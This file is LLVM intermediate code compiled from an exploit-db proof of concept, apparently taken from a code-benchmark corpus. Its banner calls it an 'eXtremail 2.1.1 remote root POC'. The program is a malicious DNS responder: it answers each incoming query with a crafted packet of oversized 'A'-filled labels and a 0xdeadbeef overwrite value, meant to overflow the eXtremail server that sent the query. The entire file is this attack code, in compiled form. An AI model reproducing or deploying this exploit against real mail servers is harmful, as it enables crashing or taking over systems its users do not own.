; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_3769.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_3769.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [110 x i8] c"eXtremail 2.1.1 remote root POC\0Aby: <mu-b@digit-labs.org>\0Ahttp://www.digit-labs.org/ -- Digit-Labs 2007!@$!\0A\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_DGRAM = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [9 x i8] c"socket()\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@INADDR_ANY = common dso_local global i32 0, align 4
@DNS_PORT = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [7 x i8] c"bind()\00", align 1
@.str.3 = private unnamed_addr constant [33 x i8] c"+Waiting for data on port %d...\0A\00", align 1
@DNS_MAX_MSG = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [24 x i8] c"- cannot receive data!\0A\00", align 1
@.str.5 = private unnamed_addr constant [26 x i8] c"+ Connection from %s: %u\0A\00", align 1
@dns_hdr_buf = common dso_local global i32 0, align 4
@DNS_HDR_LEN = common dso_local global i32 0, align 4
@HAMMER_LEN = common dso_local global i32 0, align 4
@dns_trail_buf = common dso_local global i32 0, align 4
@DNS_TRAIL_LEN = common dso_local global i32 0, align 4
@EXIT_SUCCESS = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i64, align 8
  %16 = alloca i64, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %19 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str, i64 0, i64 0))
  %20 = load i32, i32* @AF_INET, align 4
  %21 = load i32, i32* @SOCK_DGRAM, align 4
  %22 = call i32 @socket(i32 %20, i32 %21, i32 0)
  store i32 %22, i32* %6, align 4
  %23 = load i32, i32* %6, align 4
  %24 = icmp slt i32 %23, 0
  br i1 %24, label %25, label %29

25:                                               ; preds = %2
  %26 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.1, i64 0, i64 0))
  %27 = load i32, i32* @EXIT_FAILURE, align 4
  %28 = call i32 @exit(i32 %27) #4
  unreachable

29:                                               ; preds = %2
  %30 = load i32, i32* @AF_INET, align 4
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  store i32 %30, i32* %31, align 4
  %32 = load i32, i32* @INADDR_ANY, align 4
  %33 = call i32 @htonl(i32 %32)
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  %35 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %34, i32 0, i32 0
  store i32 %33, i32* %35, align 4
  %36 = load i32, i32* @DNS_PORT, align 4
  %37 = call i32 @htons(i32 %36)
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i32 %37, i32* %38, align 4
  %39 = load i32, i32* %6, align 4
  %40 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %41 = call i32 @bind(i32 %39, %struct.sockaddr* %40, i32 12)
  store i32 %41, i32* %7, align 4
  %42 = load i32, i32* %7, align 4
  %43 = icmp slt i32 %42, 0
  br i1 %43, label %44, label %48

44:                                               ; preds = %29
  %45 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i64 0, i64 0))
  %46 = load i32, i32* @EXIT_FAILURE, align 4
  %47 = call i32 @exit(i32 %46) #4
  unreachable

48:                                               ; preds = %29
  %49 = load i32, i32* @DNS_PORT, align 4
  %50 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.3, i64 0, i64 0), i32 %49)
  br label %51

51:                                               ; preds = %48, %142, %145
  %52 = load i32, i32* @DNS_MAX_MSG, align 4
  %53 = zext i32 %52 to i64
  %54 = call i8* @llvm.stacksave()
  store i8* %54, i8** %14, align 8
  %55 = alloca i8, i64 %53, align 16
  store i64 %53, i64* %15, align 8
  %56 = load i32, i32* @DNS_MAX_MSG, align 4
  %57 = mul nsw i32 %56, 4
  %58 = zext i32 %57 to i64
  %59 = alloca i8, i64 %58, align 16
  store i64 %58, i64* %16, align 8
  %60 = trunc i64 %53 to i32
  %61 = call i32 @memset(i8* %55, i32 0, i32 %60)
  %62 = trunc i64 %58 to i32
  %63 = call i32 @memset(i8* %59, i32 0, i32 %62)
  store i32 12, i32* %11, align 4
  %64 = load i32, i32* %6, align 4
  %65 = load i32, i32* @DNS_MAX_MSG, align 4
  %66 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %67 = call i32 @recvfrom(i32 %64, i8* %55, i32 %65, i32 0, %struct.sockaddr* %66, i32* %11)
  store i32 %67, i32* %10, align 4
  %68 = load i32, i32* %10, align 4
  %69 = icmp slt i32 %68, 0
  br i1 %69, label %70, label %72

70:                                               ; preds = %51
  %71 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.4, i64 0, i64 0))
  store i32 2, i32* %18, align 4
  br label %142

72:                                               ; preds = %51
  %73 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  %74 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %73, i32 0, i32 0
  %75 = load i32, i32* %74, align 4
  %76 = call i8* @inet_ntoa(i32 %75)
  %77 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  %78 = load i32, i32* %77, align 4
  %79 = call i32 @ntohs(i32 %78)
  %80 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.5, i64 0, i64 0), i8* %76, i32 %79)
  store i8* %59, i8** %17, align 8
  %81 = load i8*, i8** %17, align 8
  %82 = load i32, i32* @dns_hdr_buf, align 4
  %83 = load i32, i32* @DNS_HDR_LEN, align 4
  %84 = call i32 @memcpy(i8* %81, i32 %82, i32 %83)
  %85 = load i32, i32* @DNS_HDR_LEN, align 4
  %86 = load i8*, i8** %17, align 8
  %87 = sext i32 %85 to i64
  %88 = getelementptr inbounds i8, i8* %86, i64 %87
  store i8* %88, i8** %17, align 8
  store i32 0, i32* %13, align 4
  br label %89

89:                                               ; preds = %114, %72
  %90 = load i32, i32* %13, align 4
  %91 = load i32, i32* @HAMMER_LEN, align 4
  %92 = icmp slt i32 %90, %91
  br i1 %92, label %93, label %119

93:                                               ; preds = %89
  %94 = load i32, i32* %13, align 4
  %95 = add nsw i32 %94, 63
  %96 = load i32, i32* @HAMMER_LEN, align 4
  %97 = icmp sgt i32 %95, %96
  br i1 %97, label %98, label %102

98:                                               ; preds = %93
  %99 = load i32, i32* @HAMMER_LEN, align 4
  %100 = load i32, i32* %13, align 4
  %101 = sub nsw i32 %99, %100
  store i32 %101, i32* %12, align 4
  br label %103

102:                                              ; preds = %93
  store i32 63, i32* %12, align 4
  br label %103

103:                                              ; preds = %102, %98
  %104 = load i32, i32* %12, align 4
  %105 = load i32, i32* %13, align 4
  %106 = add nsw i32 %105, %104
  store i32 %106, i32* %13, align 4
  %107 = load i32, i32* %12, align 4
  %108 = trunc i32 %107 to i8
  %109 = load i8*, i8** %17, align 8
  %110 = getelementptr inbounds i8, i8* %109, i32 1
  store i8* %110, i8** %17, align 8
  store i8 %108, i8* %109, align 1
  %111 = load i8*, i8** %17, align 8
  %112 = load i32, i32* %12, align 4
  %113 = call i32 @memset(i8* %111, i32 65, i32 %112)
  br label %114

114:                                              ; preds = %103
  %115 = load i32, i32* %12, align 4
  %116 = load i8*, i8** %17, align 8
  %117 = sext i32 %115 to i64
  %118 = getelementptr inbounds i8, i8* %116, i64 %117
  store i8* %118, i8** %17, align 8
  br label %89

119:                                              ; preds = %89
  %120 = load i8*, i8** %17, align 8
  %121 = getelementptr inbounds i8, i8* %120, i64 -4
  %122 = bitcast i8* %121 to i64*
  store i64 3735928559, i64* %122, align 8
  %123 = load i8*, i8** %17, align 8
  %124 = getelementptr inbounds i8, i8* %123, i32 1
  store i8* %124, i8** %17, align 8
  store i8 0, i8* %123, align 1
  %125 = load i8*, i8** %17, align 8
  %126 = load i32, i32* @dns_trail_buf, align 4
  %127 = load i32, i32* @DNS_TRAIL_LEN, align 4
  %128 = call i32 @memcpy(i8* %125, i32 %126, i32 %127)
  %129 = load i32, i32* @DNS_TRAIL_LEN, align 4
  %130 = load i8*, i8** %17, align 8
  %131 = sext i32 %129 to i64
  %132 = getelementptr inbounds i8, i8* %130, i64 %131
  store i8* %132, i8** %17, align 8
  %133 = load i32, i32* %6, align 4
  %134 = load i8*, i8** %17, align 8
  %135 = ptrtoint i8* %134 to i64
  %136 = ptrtoint i8* %59 to i64
  %137 = sub i64 %135, %136
  %138 = trunc i64 %137 to i32
  %139 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %140 = load i32, i32* %11, align 4
  %141 = call i32 @sendto(i32 %133, i8* %59, i32 %138, i32 0, %struct.sockaddr* %139, i32 %140)
  store i32 %141, i32* %10, align 4
  store i32 0, i32* %18, align 4
  br label %142

142:                                              ; preds = %119, %70
  %143 = load i8*, i8** %14, align 8
  call void @llvm.stackrestore(i8* %143)
  %144 = load i32, i32* %18, align 4
  switch i32 %144, label %146 [
    i32 0, label %145
    i32 2, label %51
  ]

145:                                              ; preds = %142
  br label %51

146:                                              ; preds = %142
  unreachable
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @htonl(i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @bind(i32, %struct.sockaddr*, i32) #1

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #3

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @recvfrom(i32, i8*, i32, i32, %struct.sockaddr*, i32*) #1

declare dso_local i8* @inet_ntoa(i32) #1

declare dso_local i32 @ntohs(i32) #1

declare dso_local i32 @memcpy(i8*, i32, i32) #1

declare dso_local i32 @sendto(i32, i8*, i32, i32, %struct.sockaddr*, i32) #1

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #3

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
